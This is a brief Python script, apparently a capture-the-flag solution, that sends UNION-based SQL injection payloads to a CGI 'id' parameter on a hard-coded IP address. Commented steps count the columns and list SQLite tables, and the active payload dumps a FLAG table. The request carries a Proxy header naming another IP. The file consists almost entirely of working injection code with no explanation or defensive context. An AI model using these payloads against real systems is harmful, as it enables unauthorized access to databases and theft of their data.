import requests

# Test how much col in news;
# 1 => 1,2 => 1,2,3 => 1,2,3,4 
#idc = "4' UNION SELECT 1,2 FROM news WHERE '1'='1"

# get tables name ( can use offset )
#idc = "4' UNION SELECT 1,name FROM sqlite_master WHERE '1'='1"

# Test how much col in FLAG and output;
idc = "4' UNION SELECT 1, * FROM FLAG WHERE ''='"

r = requests.get('http://54.199.254.155/cgi-bin/?id={}'.format(idc), headers={"Proxy": "139.162.80.37:8888"})
print "SELECT * FROM news WHERE id='%s'"%idc
print r.text
